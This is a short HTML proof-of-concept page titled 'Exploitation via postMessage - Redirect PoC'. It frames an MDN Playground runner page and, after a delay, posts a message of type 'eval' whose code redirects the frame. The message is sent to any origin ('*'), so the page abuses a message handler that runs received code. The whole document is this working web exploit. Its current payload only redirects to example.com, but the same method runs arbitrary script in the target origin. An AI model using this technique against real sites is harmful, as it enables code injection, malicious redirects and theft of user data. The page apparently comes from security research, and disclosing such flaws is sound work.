<!DOCTYPE html>
<html>
  <body>
    <h1>Exploitation via postMessage - Redirect PoC</h1>

    <iframe id="targetFrame"
      src="https://fc356f5a-2c8c-41cb-986a-4f2410e99d7c.mdnplay.dev/runner.html?state=Lc2xDsIgGEXhV2lu4lYLXRyw%2BBLGjYWW34KlhQBRq%2FHdTaPTyTedN2yZPQQ6d016piqnQSrYUmIWjBm6kw%2BRUjOHl%2FNeNyGNjJb95cyi16uCWh7OFCsVWs53my250RapcOB8cy6rJ6nQh2QoiTY%2Bqxy8M1Xv9TAdFU4d%2B81PqDHkDAHUuP1bLM0EAaPThM8X"
      style="width: 100%; height: 600px; border: 1px solid black;">
    </iframe>

    <script>
      const target = document.getElementById('targetFrame').contentWindow;

      window.addEventListener("message", (e) => {
        console.log("Received from iframe", e.data);
      });

      // Wait for iframe to load, then send the malicious postMessage
      setTimeout(() => {
        target.postMessage({
          type: 'eval',
          code: 'location.href="https://example.com";'
        }, '*');
      }, 2000);
    </script>
  </body>
</html>
